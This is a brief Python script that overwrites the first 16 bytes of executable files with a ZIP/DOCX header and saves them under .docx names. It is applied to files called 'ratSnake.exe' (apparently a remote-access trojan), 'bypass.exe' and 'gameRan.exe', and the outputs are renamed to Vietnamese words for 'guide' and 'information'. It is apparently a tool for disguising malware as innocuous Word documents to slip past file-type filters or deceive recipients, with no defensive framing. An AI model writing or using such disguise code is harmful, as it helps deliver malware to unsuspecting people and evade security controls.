#50 4B 03 04 0A 00 00 00 00 00 87 4E E2 40 00 00
def transfer(fileNameOfExe, fileNameOfDocx):
    old = open(fileNameOfExe, "rb").read()
    new = open(fileNameOfDocx, "wb")
    check = False
    for i in range(0, len(old), 16):
        S = old[i:i+16]
        if check == False:
            S = [80, 75, 3, 4, 10, 0, 0, 0, 0, 0, 135, 78, 226, 64, 0, 0]
            array=bytearray(S)
            new.write(array)
            check = True
        else:
            new.write(S)
transfer("gameRan.exe", "gameRan.docx")
transfer("ratSnake.exe", "huongDan.docx")
transfer("bypass.exe", "thongTin.docx")
